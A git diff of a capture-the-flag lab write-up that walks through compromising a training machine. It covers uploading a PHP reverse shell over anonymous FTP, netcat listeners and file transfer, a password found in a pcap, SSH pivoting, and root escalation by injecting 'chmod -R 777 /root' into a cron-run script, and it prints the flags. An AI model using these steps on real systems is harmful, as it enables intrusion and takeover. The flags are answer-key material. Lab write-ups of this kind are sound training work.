@@ -2,7 +2,7 @@
 
 --------------------------------------------------------------------
 
-**TOOLS USED**: nmap, gobuster, hydra
+**TOOLS USED**: nmap, gobuster, wireshark, pspy64
 
 --------------------------------------------------------------------
 
@@ -57,9 +57,130 @@ steghide extract -sf important.jpg
 
 nothing interesting found
 
-### 2. BRUTE FORCE SSH
+### 2. REVERSE SHELL
+
+Copy php reverse shell and edit IP
+```
+cp /usr/share/webshells/php/php-reverse-shell.php .
+```
+
+![2.1](./imgs/2.1.png)
+
+Upload php reverse shell to ftp server<br>
+the /ftp directory has open permissions so we can upload to there 
+```
+ftp anonymous@10.10.228.144
+put php-reverse-shell.php
+```
+
+![2.2](./imgs/2.2.png)
+
+Start listener
+```
+nc -lnvp 1234
+```
+
+Activate the php reverse shell
+```
+curl http://10.10.228.144/files/ftp/php-reverse-shell.php
+```
+
+![2.3](./imgs/2.3.png)
 
 ```
-hydra -l maya -P /usr/share/wordlists/rockyou.txt ssh://10.10.228.144
+cat recipe.txt
 ```
+![2.4](./imgs/2.4.png)
+
+**SECRET INGREDIENT**: love
+
+```
+cd incidents
+```
+
+Found pcap file
+
+![2.5](./imgs/2.5.png)
+
+Transfer to host machine
+
+Start listener
+```
+nc -lnvp 4444 > file.pcapng
+```
+
+Send file
+```
+nc -v 10.10.228.144 4444 < suspicious.pcapng
+```
+
+### 3. WIRESHARK
+
+Open pcap file in wireshark
+
+![3.1](./imgs/3.1.png)
+
+Someone started a reverse shell to 192.168.22.139:4444
+
+Also found password
+
+![3.2](./imgs/3.2.png)
+
+**PASSWORD**: c4ntg3t3n0ughsp1c3
+
+### 4. PIVOT
+
+user lennie in /home directory
+
+SSH as lennie
+```
+ssh lennie@10.10.228.144
+```
+
+![4.1](./imgs/4.1.png)
+
+**USER FLAG**: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+
+### 5. PRIVILEGE ESCCALATION
+
+check privileges
+```
+sudo -l
+```
+
+No sudo privileges
+
+Found potential script we could exploit
+
+![5.1](./imgs/5.1.png)
+
+planner.sh is owned by root and executes /etc/print.sh<br>
+lennie owns print.sh so we can inject or own code into it
+
+Check for cronjobs executed by root<br>
+Get pspy64 from https://github.com/DominicBreuker/pspy and transfer to lennie
+```
+scp pspy64 lennie@10.10.228.144:/home/lennie/pspy64
+```
+
+Run pspy64
+```
+chmod +x pspy64
+./pspy64
+```
+
+![5.2](./imgs/5.2.png)
+
+planner.sh is being executed by root every minute
+
+Edit print.sh and exfiltrate files in /root
+```
+echo "chmod -R 777 /root" >> /etc/print.sh
+```
+
+This will give /root and all its contents open permissions
+
+![5.3](./imgs/5.3.png)
+
+**ROOT FLAG**: THM{f963aaa6a430f210222158ae15c3d76d}
 
